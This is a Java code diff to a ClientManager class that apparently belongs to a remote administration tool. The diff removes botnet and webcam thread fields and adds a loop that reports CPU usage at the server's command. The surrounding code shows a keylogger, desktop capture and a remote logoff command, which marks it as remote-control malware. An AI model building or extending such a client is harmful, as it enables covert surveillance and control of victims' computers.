@@ -32,8 +32,6 @@ import java.util.ArrayList;
 import java.util.Base64;
 
 public class ClientManager {
-    // Botnet
-    private Thread botnet;
 
     // Desktop
     private Thread desktop;
@@ -43,9 +41,6 @@ public class ClientManager {
 
     private Thread cpuUsage;
     private boolean trackingCPU;
-    // Webcam
-    private Thread webcam;
-    private boolean runningWebcam;
 
     // KeyLogger
     private KeyLogger keylogger;
@@ -61,6 +56,27 @@ public class ClientManager {
 
         if (packet.action == MessageType.PERFORMANCE_TRACK.getID()){
             System.out.println("Received from server:" + packet.data);
+            try {
+                if (packet.data.get(0).equals("start")) {
+                    trackingCPU = true;
+                    if (cpuUsage == null || !cpuUsage.isAlive()) {
+                        cpuUsage = new Thread((new Runnable() {
+                            @Override
+                            public void run() {
+                                TrackCpu(pw);
+                            }
+                        }));
+                        cpuUsage.start();
+                    }
+                } else if (packet.data.get(0).equals("stop")) {
+                    trackingCPU = false;
+                    if (this.cpuUsage != null && this.cpuUsage.isAlive()) {
+                        this.cpuUsage.stop();
+                    }
+                }
+            } catch (Exception e) {
+                System.out.println("Failed to process performance packet");
+            }
             sendCpuUsage(pw);
         }
 
@@ -141,6 +157,22 @@ public class ClientManager {
         } else if (packet.action == MessageType.LOGOFF.getID()) {
             SendCommand.SenCommand_LogOff();
             System.out.println("Client logging off");
+        }
+    }
+    private void TrackCpu(PrintWriter pw) {
+        while (trackingCPU) {
+            try {
+                sendCpuUsage(pw);
+            } catch (ThreadDeath tde) {
+                System.out.println("Stopped tracking");
+            }
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException ie) {
+                System.out.println("Tracking sleep stopped");
+            } catch (ThreadDeath tde) {
+                System.out.println("Thread dead while tracking");
+            }
         }
     }
 
